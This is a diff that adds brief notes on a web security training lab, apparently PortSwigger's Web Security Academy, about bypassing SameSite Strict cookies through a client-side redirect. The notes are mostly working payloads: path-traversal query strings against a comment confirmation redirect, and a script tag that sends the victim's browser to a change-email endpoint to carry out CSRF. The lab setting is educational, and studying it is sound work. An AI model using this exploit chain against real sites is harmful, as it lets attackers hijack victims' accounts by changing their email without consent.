@@ -1,0 +1,16 @@
+ameSite Strict bypass via client-side redirect
+
+Goal - Exploit CSRF to change the victim's email address.
+
+
+Analysis:
+
+Payload 1: /post/comment/confirmation?postId=6
+
+Payload 2: /post/comment/confirmation?postId=../my-account/
+
+Payload 3: /post/comment/confirmation?postId=../my-account/change-email?email=test5%40test.com%26submit=1
+
+<script>
+   document.location="https://0a9700300377073b802c2b9f000800f1.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=test2%40test.ca%26submit=1";
+</script>
